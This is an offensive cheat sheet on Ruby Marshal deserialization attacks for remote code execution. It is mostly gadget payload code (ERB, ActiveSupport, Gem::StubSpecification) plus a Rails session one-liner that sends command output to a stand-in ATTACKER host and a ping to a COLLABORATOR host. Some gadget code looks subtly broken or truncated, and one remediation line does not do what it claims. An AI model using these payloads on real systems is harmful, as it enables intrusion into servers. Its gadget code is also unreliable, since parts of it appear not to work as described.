# Ruby MARSHAL Deserialization — RCE

## Summary
Ruby's `Marshal.load()` accepts serialised objects and reconstructs them, calling `_load` or `marshal_load` hooks. When a gadget chain is available, arbitrary code execution follows.

## Identification

### Marshal Header
```hex
04 08  —  version 4.8 header bytes
```

### Common Locations
- Rails session cookies (base64-encoded Marshal dump)
- Redis-backed session stores
- Database columns storing serialised Ruby objects
- Delayed::Job / Sidekiq job payloads

## Detection

```bash
# Decode Rails session cookie to check for Marshal
echo "BAh7BkkiCHgGOgZJVEkiFWhlbGxv...==" | base64 -d | xxd
# Look for 04 08 header
```

### Ruby Marshal Decode
```ruby
require 'base64'
data = Base64.decode64('BAh7BkkiCHgGOgZJVEkiFWhlbGxv...==')
puts data[0..1].bytes.inspect
# => [4, 8]  ← confirmed Marshal
```

## Payload Generation

### Using ERB gadget (universal)
```ruby
require 'base64'

# ERB gadget — triggers RCE on Marshal.load
class ErbGadget
  def initialize(cmd)
    @cmd = cmd
  end
  def marshal_dump
    ERB.new("<%= `#{@cmd}` %>").src
  end
end

payload = Base64.encode64(Marshal.dump(ErbGadget.new('id')))
puts payload
```

### Using ActiveSupport::Deprecation (Rails)
```ruby
# Rails-specific gadget via ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
require 'active_support/deprecation'
require 'base64'

proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(
  ERB.new("<%= `id` %>"), :result, :@result
)
puts Base64.encode64(Marshal.dump(proxy))
```

### Using Gem::StubSpecification (Ruby < 2.7)
```ruby
stub = Gem::StubSpecification.new
stub.data = "\x04\x08o:\x1fGem::StubSpecification\x06:\x0d@dataI\"..."
puts Base64.encode64(Marshal.dump(stub))
```

## Rails Session Exploitation

```bash
# 1. Capture session cookie
# 2. Decode, check if Marshal
echo "SESSION_COOKIE" | base64 -d | xxd

# 3. Generate malicious payload
ruby -e '
require "base64"
require "erb"
class E
  def initialize(c)
    @c = c
  end
  def marshal_dump
    ERB.new("<%= `#{@c}` %>").src
  end
end
puts Base64.encode64(Marshal.dump(E.new("curl http://ATTACKER/$(id)")))
' | xargs -I{} curl -b "session={}" https://target.com/
```

## Blind / OOB Detection

```ruby
# DNS callback
require 'base64'
payload = Base64.encode64(Marshal.dump(
  ErbGadget.new('ping -c 1 COLLABORATOR')
))
```

## Remediation
- Never use `Marshal.load()` on untrusted data
- Use JSON for session serialisation (`Rails.application.config.session_store :cookie_store`)
- Set `secret_key_base` with a strong random value
- Upgrade Ruby to versions with patched Marshal gadgets
